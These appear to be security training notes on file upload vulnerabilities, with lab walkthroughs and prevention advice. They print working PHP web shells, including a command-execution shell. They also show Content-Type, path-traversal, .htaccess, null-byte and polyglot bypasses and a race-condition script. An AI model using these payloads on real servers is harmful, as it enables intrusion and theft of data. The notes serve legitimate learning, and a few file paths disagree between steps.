# File Upload Vulnerabilities

## What are file upload vulnerabilities?

* Servers allow users to upload files to their filesystem without sufficiently validating:
  * Type
  * Content
  * Size

## What is the impact of file upload vulnerabilities?

* The impact depends on which aspect of the file the website fails to validate properly (size, type, contents) and the restrictions imposed on the file once uploaded.
* If the server is misconfigured and allows files with extensions such as .php or .jsp to execute, an attacker can upload a web shell and gain full control of the server.
* Improper validation can allow an attacker to overwrite critical files:
  * By uploading a file with the same name.
  * If the server is vulnerable to directory traversal, the attacker can upload files to unanticipated locations.
* If the server doesn't check file size thresholds, an attacker can cause a denial of service by filling available disk space.

## How do file upload vulnerabilities arise?

* Developer implementation flaws that are easily bypassed:
  * Blacklisting dangerous file types but failing to account for parsing discrepancies.
  * Not checking file extensions or omitting obscure file types.
* Websites may attempt to check file type by verifying properties that can be manipulated by an attacker (e.g., with Burp Repeater).
* Inconsistent application of validation across hosts and directories.

## How do web servers handle requests for static files?

* Historically, websites consisted mostly of static files. Today many sites are dynamic, but static-file handling is still fundamental:
  * The server parses the path in the request to identify the file extension.
  * It maps the extension to a MIME type using preconfigured mappings.
  * If the file is non-executable (image, static HTML), the server typically sends the file content to the client.
  * If the file is executable (PHP) and the server is configured to execute that type:
    * The server runs the script, possibly assigning variables from headers/parameters, and returns the resulting output.
  * If the file is executable but the server is not configured to execute it:
    * The server may respond with an error or serve the file content as plain text. This misconfiguration can leak source code and other sensitive information.

## Exploiting unrestricted file upload to deploy a web shell

A web shell is a malicious script that lets an attacker execute arbitrary commands on a remote web server via HTTP requests.

* With a web shell an attacker can:
  * Read and write arbitrary files
  * Exfiltrate sensitive data
  * Pivot to other systems

Example PHP web shell snippet to read a file:

```php
<?php echo file_get_contents('/path/to/target/file'); ?>
```

Once uploaded and executed, this returns the target file's contents in the response.

### Lab: Remote code execution via web shell upload

{% stepper %}
{% step %}
### Vulnerability

The lab contains an image upload function with no validation before storing files on the server filesystem.
{% endstep %}

{% step %}
### End-goal

Upload a basic PHP web shell and use it to exfiltrate the contents of `/home/carlos/secret`.
{% endstep %}

{% step %}
### Analysis / Recon

* Login while proxying traffic through BURP with credentials `wiener:peter`.
* Upload an arbitrary image; the avatar is displayed on the account page.
* In Burp: Proxy > HTTP history. Filter by MIME type "images" so you can find the GET request that fetched the avatar:
  * Example: `GET /files/avatars/<...>`
* Send that GET request to Burp Repeater.
{% endstep %}

{% step %}
### Attack

* Create a file `exploit.php` containing:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

* Use the avatar upload function to upload this PHP file; confirm you receive a 200 response.
* In Burp Repeater, change the path to point to your uploaded PHP file:

```
GET /files/avatars/exploit.php HTTP/1.1
```

* Send the request. The server executes the script and returns the secret file contents in the response.
{% endstep %}

{% step %}
### Payload

exploit.php

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
{% endstep %}
{% endstepper %}

Other example web shell:

```php
<?php echo system($_GET['command']); ?>
```

Request example:

```
GET /example/exploit.php?command=id HTTP/1.1
```

## Exploiting flawed validation of file uploads

* Flaws in defenses often allow bypasses:
  * The browser sends file uploads as multipart/form-data. Parts include Content-Disposition and Content-Type headers.
  * If the server trusts the Content-Type header or filename without further validation, an attacker can tamper with these fields.
* Tools like Burp Repeater make it straightforward to modify request fields and bypass naive checks.

Example multipart/form-data snippet:

```
POST /images HTTP/1.1
Host: normal-website.com
Content-Length: 12345
Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="image"; filename="example.jpg"
Content-Type: image/jpeg

[...binary content of example.jpg...]
---------------------------012345678901234567890123456
Content-Disposition: form-data; name="description"

This is an interesting description of my image.

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="username"

wiener
---------------------------012345678901234567890123456--
```

#### Lab: Web shell upload via Content-Type restriction bypass

{% stepper %}
{% step %}
### Vulnerability

The website relies only on checking user-controlled input (e.g., Content-Type) to restrict uploads to images.
{% endstep %}

{% step %}
### End-goal

Upload a PHP web shell and exfiltrate `/home/user/creditcards_info`.
{% endstep %}

{% step %}
### Reconnaissance

* Login and upload an image.
* In Burp: Proxy > HTTP history. Find the GET request fetching the image:
  * `GET /files/profilepicture/<YOUR-IMAGE>`
* Send that GET request to Burp Repeater.
* Create `exploit.php`:

```php
<?php echo file_get_contents('/home/user/credit_cards_info'); ?>
```
{% endstep %}

{% step %}
### Attack

* Attempt to upload `exploit.php` as profile\_picture; the site only allows jpeg/png.
* In Burp, find the `POST /your-account/<exploit.php>` request and send it to Repeater.
* Change the `Content-Type` header to `image/jpeg`.
* Send the request; the file uploads successfully.
* Fetch the file via:
  * `GET /files/<path-to-your-image>` and replace with `exploit.php`.
* The response contains customers' credit card information.
{% endstep %}

{% step %}
### Payload

exploit.php

```php
<?php echo file_get_contents('/home/user/credit_cards_info'); ?>
```
{% endstep %}
{% endstepper %}

## Preventing file execution in user-accessible directories

* Don't allow dangerous files to be uploaded into directories that can execute them.
* Configure the server so it only executes scripts for file types explicitly configured for execution.
* If execution is prevented, return uploaded script contents as plain text (which may leak source code but prevents execution).

Example response serving PHP as text/plain:

```
GET /static/exploit.php?command=id HTTP/1.1
Host: normal-website.com

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 39

<?php echo system($_GET['command']); ?>
```

* Different directories may have different configurations. Uploading to a directory with relaxed rules may allow execution.
* Note: web servers use the `Filename` field in `multipart/form-data` requests to determine where to save uploaded files.

### Lab: Web shell upload via path traversal

{% stepper %}
{% step %}
### Introduction

A pentester finds an image upload function vulnerable to path traversal and server misconfiguration, enabling a web shell upload via directory traversal.
{% endstep %}

{% step %}
### Vulnerability / Problem

Image upload function is vulnerable; server misconfigured.
{% endstep %}

{% step %}
### Payload & End-goal

Upload `exploit.php`:

```php
<?php echo file_get_contents('/home/home-only/sensitive/'); ?>
```

and use it to exfiltrate sensitive data.
{% endstep %}

{% step %}
### Reconnaissance / Plan

* Log in and upload an image.
* In Burp Proxy > HTTP history find:
  * `GET /files/image/<Your-image>`
* Send to Repeater.
* Create `exploit.php` with:

```php
<?php echo file_get_contents('/home/Admin-only/sensitive'); ?>
```

The website blocks direct PHP uploads.
{% endstep %}

{% step %}
### Attack

* In Repeater, replace the name of your image with `exploit.php` and send the GET request. The server responds with the PHP file contents as plain text.
* In Proxy history, send the `POST /my-account/image` request to Repeater.
* In the multipart body, change the Content-Disposition filename to include directory traversal:

```
Content-Disposition: form-data; name="image"; filename="../exploit.php"
```

* Server strips traversal sequences and uploads as `image/exploit.php`.
{% endstep %}

{% step %}
### Exploit / Enumeration

* URL-encode the forward slash: `filename="..%2fexploit.php"`.
* Server decodes and stores the file so that a request appears as:
  * `GET /files/image/..%2fexploit.php`
* Request `GET /files/exploit.php`. The server executes it and returns sensitive data.
{% endstep %}

{% step %}
### Mitigation

* (See general mitigations later in this document.)
{% endstep %}
{% endstepper %}

Note: A domain can point to different servers (reverse proxies, load balancers). Your requests may be handled by different back-end servers with different configurations.

## Insufficient blacklisting of dangerous file types

* Blacklisting extensions (e.g., `.PHP`) is flawed—it's impossible to block every executable extension.
* Bypasses may use lesser-known executable extensions like `.php5` or `.shtml`.

### Overriding the server configuration

* Servers only execute files when configured to do so (e.g., Apache with mod\_php).
* Many servers allow directory-specific configuration files (e.g., `.htaccess` for Apache, `web.config` for IIS) to override global settings.
* If you can upload such a configuration file, you can map an arbitrary extension to an executable MIME type, causing the server to execute files with that extension.

Example IIS staticContent directive:

```xml
<staticContent><mimeMap fileExtension=".json" mimeType="application/json" /></staticContent>
```

#### Lab: Web shell upload via extension blacklist bypass

{% stepper %}
{% step %}
### Introduction

A pentester targets an image upload function that blacklists certain extensions but can be bypassed.
{% endstep %}

{% step %}
### Vulnerability / Problem

Some extensions are blacklisted, but the blacklist is flawed.
{% endstep %}

{% step %}
### Payload & End-goal

Upload a PHP web shell and exfiltrate sensitive data using an alternative extension mapping.
{% endstep %}

{% step %}
### Reconnaissance / Plan

* Upload an image and find the GET request:
  * `GET /files/images/<YOUR-IMAGE>`
* Send to Repeater.
* Create `exploit.php` containing:

```php
<?php echo file_get_contents('/home/users'); ?>
```

* Attempt to upload; the site blocks `.php`.
{% endstep %}

{% step %}
### Attack

* In the `POST /my-account/image` request (found in proxy history), send it to Repeater.
* Modify the multipart body:
  * Set filename to `.htaccess`
  * Set Content-Type to `text/plain`
  * Replace file content with:

```
AddType application/x-httpd-php .shell
```

* This maps `.shell` to PHP execution.
* Send the request to upload `.htaccess`.
{% endstep %}

{% step %}
### Exploit / Enumeration

* Upload `exploit.shell` (rename `exploit.php` to `exploit.shell`) via the same upload endpoint.
* Request `GET /files/images/exploit.shell`. The server treats `.shell` as PHP and executes it, returning secrets.
{% endstep %}

{% step %}
### Mitigation

* (See general mitigations later in this document.)
{% endstep %}
{% endstepper %}

## Obfuscating file extensions

Even robust blacklists can be bypassed via obfuscation techniques:

Techniques:

1. Multiple extensions: `exploit.php.jpg` may be interpreted as PHP or JPG.
2. Trailing characters: `exploit.php.` — some components strip trailing dots/whitespace.
3. URL encoding (or double encoding): `exploit%2Ephp`.
4. Semicolons or URL-encoded null bytes: `Exploit.asp;.jpg` or `Exploit.asp%00.jpg`.
5. Multibyte Unicode tricks that get normalized/converted differently between validation and OS-level path handling.

Note: Case-sensitivity issues (e.g., `exploit.pHp`) can bypass checks that are case-sensitive.

#### Lab: Web shell upload via obfuscated file extension

{% stepper %}
{% step %}
### Introduction

A pentester targets an image upload function protected by extension blacklisting and bypasses it with filename obfuscation.
{% endstep %}

{% step %}
### Vulnerability / Problem

Blacklisting can be bypassed using filename obfuscation tricks.
{% endstep %}

{% step %}
### Payload & End-goal

Upload `exploit.php` (or an obfuscated variant) and exfiltrate `/home/users/secret`.
{% endstep %}

{% step %}
### Reconnaissance / Plan

* Upload an image and locate `GET /files/images/<YOUR-IMAGE>` in Burp proxy history, then send it to Repeater.
* Create `exploit.php`:

```php
<?php echo file_get_contents('/home/users/secret'); ?>
```

* Attempt to upload; the server allows only JPG/PNG.
{% endstep %}

{% step %}
### Attack

* In the `POST /my-account/image` request, modify the filename to include a URL-encoded null byte followed by `.jpg`:

```
filename="exploit.php%00.jpg"
```

* Send the request. The server may strip the null byte and `.jpg`, treating the file as `exploit.php`.
* Request `GET /files/images/exploit.php`. The server executes it and returns the secret.
{% endstep %}

{% step %}
### Mitigation

* (See general mitigations later in this document.)
{% endstep %}
{% endstepper %}

## Flawed validation of the file's contents

* More secure servers verify that file content matches the expected format:
  * For images: dimensions, magic bytes (JPEG begins with FF D8 FF).
* This is robust but not foolproof: attackers can create polyglot files (e.g., a valid JPEG with PHP code in metadata) using tools like ExifTool.

#### Lab: Remote code execution via polyglot web shell upload

{% stepper %}
{% step %}
### Introduction

A pentester creates a polyglot file (PHP + JPG) to bypass content checks.
{% endstep %}

{% step %}
### Vulnerability / Problem

Server checks file content for being an image, but a polyglot image can pass these checks while containing PHP payload.
{% endstep %}

{% step %}
### Payload & End-goal

Upload `polyglot.php` containing embedded PHP code that exfiltrates `/home/documents/customer`.
{% endstep %}

{% step %}
### Reconnaissance / Plan

* Create `exploit.php` with:

```php
<?php echo file_get_contents('/home/documents/customer'); ?>
```

* The server initially blocks direct PHP uploads.
{% endstep %}

{% step %}
### Attack

* Use ExifTool to embed PHP into image metadata and output a file named `polyglot.php`:

```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/document/customer') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
```

* Upload the resulting file. The server accepts it as an image but may store it as `.php`.
{% endstep %}

{% step %}
### Exploit / Enumeration

* In Burp Proxy history find `GET /files/avatars/polyglot.php`.
* Search the response for the strings `START` and `END`: the customer data will be embedded in the binary response.
{% endstep %}

{% step %}
### Mitigation

* (See general mitigations later in this document.)
{% endstep %}
{% endstepper %}

## Exploiting file upload race conditions

* Secure frameworks typically use a temporary sandboxed directory and randomized filenames, validate the temporary file, and only move it to final destination once safe.
* Developer-implemented uploads that deviate from this can introduce race conditions:
  * Example flawed flow: move file to final location first, then run antivirus and validation; if validation fails, delete the file. The short window between upload and deletion can be exploited.

Example vulnerable PHP snippet:

```php
<?php
$target_dir = "avatars/";
$target_file = $target_dir . $_FILES["avatar"]["name"];

// temporary move
move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);

if (checkViruses($target_file) && checkFileType($target_file)) {
    echo "The file ". htmlspecialchars( $target_file). " has been uploaded.";
} else {
    unlink($target_file);
    echo "Sorry, there was an error uploading your file.";
    http_response_code(403);
}

function checkViruses($fileName) {
    // checking for viruses
    ...
}

function checkFileType($fileName) {
    $imageFileType = strtolower(pathinfo($fileName,PATHINFO_EXTENSION));
    if($imageFileType != "jpg" && $imageFileType != "png") {
        echo "Sorry, only JPG & PNG files are allowed\n";
        return false;
    } else {
        return true;
    }
}
?>
```

* This race window can often be exploited by sending the POST followed quickly by GET requests (e.g., via Burp Repeater or Turbo Intruder).

#### Lab: Web shell upload via race condition

{% stepper %}
{% step %}
### Introduction

A pentester exploits a race condition during upload handling to get a web shell executed before it is deleted.
{% endstep %}

{% step %}
### Vulnerability / Problem

The site performs validation after moving the uploaded file into place, giving a brief execution window.
{% endstep %}

{% step %}
### Payload & End-goal

Exploit a race to exfiltrate `/home/admin/document` using a PHP web shell.
{% endstep %}

{% step %}
### Reconnaissance / Plan

* Upload an image and find `GET /files/avatars/<YOUR-IMAGE>` in Burp history.
* Create `exploit.php`:

```php
<?php echo file_get_contents('/home/admin/documents'); ?>
```

* The server blocks direct uploads.
{% endstep %}

{% step %}
### Attack

* Use Turbo Intruder to send one POST (upload exploit.php) followed very quickly by multiple GET requests to fetch the file before deletion.
* In Turbo Intruder, queue the POST and multiple GETs and open the gate so they fire nearly simultaneously.
{% endstep %}

{% step %}
### Exploit / Enumeration

* If timed correctly, one of the GETs will hit while the uploaded PHP file exists and returns the documents.
* Inspect responses for leaked data.
{% endstep %}

{% step %}
### Mitigation

* (See general mitigations later in this document.)
{% endstep %}
{% endstepper %}

Example Turbo Intruder template:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    request1 = '''<YOUR-POST-REQUEST>'''

    request2 = '''<YOUR-GET-REQUEST>'''

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
```

## Race condition in URL-based file uploads

* Upload-by-URL flows require the server to fetch remote files and often use temporary directories and names.
* If temporary directory names are predictable (e.g., PHP uniqid) they can be brute-forced.
* Increasing processing time (large files, chunked uploads) lengthens the window for brute-force or race exploitation.
* Attackers may upload large files with payload at start and padding to increase processing time.

## Exploiting file upload vulnerabilities without remote code execution

1. Uploading malicious client-side scripts:
   * Upload HTML or SVG with tags to create stored XSS if uploaded files are served same-origin.
2. Exploiting parsing vulnerabilities:
   * Upload XML-based files (e.g., .doc, .xls) and attempt XXE or parser-specific exploits.

## Uploading Files using PUT method

* Some servers support HTTP PUT; if defenses are absent, PUT can allow file uploads even without a web interface.

Example:

```
PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php echo file_get_contents('/path/to/file'); ?>
```

Tip: Send OPTIONS requests to endpoints to check supported methods, including PUT.

## How to prevent File Upload Vulnerabilities

* Prefer whitelisting permitted extensions (allow-list) instead of blacklisting.
* Filenames must not contain substrings that can be interpreted as directory traversal (`../`).
* Rename uploaded files to avoid collisions and predictable names.
* Do not move files into permanent filesystem locations until they are fully validated.
* Use established frameworks and libraries for handling uploads and validation.
* Apply strict directory-level configuration to prevent execution in upload directories (e.g., disable script execution).
* Validate both filename and file contents; canonicalize before validation.
* Enforce file size limits and quotas to prevent disk-filling DoS.
* Avoid trusting client-controlled headers (Content-Type, filename); verify server-side using robust techniques.
* Ensure directory-specific configuration files (e.g., .htaccess, web.config) cannot be uploaded or are ignored in upload directories.

## Notes and hints

{% hint style="info" %}
* Blacklisting is fundamentally brittle—use allow-lists.
* Always validate on the server side; client-side checks are insufficient.
* Be aware of per-directory server configuration and possible overrides.
{% endhint %}
